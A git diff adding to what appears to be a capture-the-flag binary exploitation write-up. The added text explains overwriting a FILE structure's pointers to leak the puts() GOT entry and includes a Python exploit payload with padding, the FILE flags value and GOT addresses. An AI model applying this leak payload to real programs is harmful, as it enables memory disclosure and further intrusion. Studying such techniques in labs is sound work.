@@ -157,7 +157,21 @@ After using option 3, we can see that the struct is now populated with values.
 
 ![image](https://github.com/user-attachments/assets/d9123403-d0ad-450e-b409-864d182c755a)
 
-The contents of the bee script is read into 0x405690 which corresponds to the values in the struct above.
+The contents of the bee script is read into 0x405690 which corresponds to the values in the struct above. Now, our goal will be to overwrite the pointers on the struct to trick it into thinking theres a buffer located somewhere else. Then we will use option 3 to leak this value. Our target will be the GOT entry of puts()
+
+```
+[0x403f88] puts@GLIBC_2.2.5  →  0x7ffff7c80ed0
+```
+
+```py
+payload = b"A" * 0x28
+payload += p64(0x1e1)
+payload += p64(0xfbad2488)
+payload += p64(0x403f88)
+payload += p64(0x404f88)
+payload += p64(0x403f88) * 5
+payload += p64(0x404f88)
+```
 
 ## Game/World 1
 
